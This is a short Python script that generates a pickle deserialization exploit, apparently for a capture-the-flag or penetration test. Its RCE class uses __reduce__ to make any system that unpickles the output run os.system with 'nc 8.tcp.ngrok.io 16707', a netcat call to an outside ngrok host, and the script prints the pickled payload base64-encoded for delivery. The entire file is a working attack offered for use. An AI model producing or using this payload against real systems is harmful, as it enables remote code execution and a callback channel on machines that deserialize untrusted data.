import pickle
from base64 import urlsafe_b64encode as b64e
import os


class RCE:
    def __reduce__(self):
        cmd = ('nc 8.tcp.ngrok.io 16707')
        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(b64e(pickled))